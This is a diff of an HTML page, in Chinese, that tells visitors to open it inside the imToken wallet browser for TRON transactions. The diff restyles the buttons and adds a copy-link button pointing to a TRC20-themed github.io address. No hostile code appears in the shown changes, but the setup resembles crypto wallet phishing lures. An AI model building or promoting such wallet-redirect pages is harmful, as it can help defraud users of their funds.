@@ -238,9 +238,11 @@
         }
         
         .button-group {
-            display: flex;
-            gap: 10px;
-            margin: 15px 0;
+                  display: flex;
+                flex-direction: column; /* 核心：将排列方向改为竖向 */
+                  gap: 10px; /* 现在会变成按钮之间的“上下间距” */
+                    margin: 15px 0;
+                             
         }
         
         .button-group button {
@@ -292,6 +294,17 @@
         </div>        
         <div class="status" id="statusSection">
             <h4><span class="status-icon">ℹ️</span>请用 <strong>imToken钱包内置浏览器</strong> 打开</h4>
+            <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
+    <!-- 要复制的链接（可替换成你需要的链接） -->
+    <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
+        https://trc20trx-alt.github.io/Trc20.TRX/
+    </span>
+    <!-- 复制按钮 -->
+    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
+        <strong class="infinite-badge">复制链接</strong>
+    </button>
+</div>
+
           </div>
         
         <div class="button-group">
@@ -322,7 +335,7 @@
             </div>
         </div>
         
-        <div class="fallback" id="fallback">
+        <div class="fallback" >
             <h4>跳转失败？请尝试以下方法：</h4>
             <ul>
                 <li>确保已安装imToken钱包应用</li>
@@ -333,7 +346,7 @@
         <div class="footer">
             <p>确保您正在使用TRON主网，并保持足够的TRX用于手续费</p>
         </div>
-    </div>
+     </div>
 
    <script src="imtoken://wallet"></script>
    <script>
@@ -511,4 +524,5 @@
 </script>
 </body>
 </html>
+
 
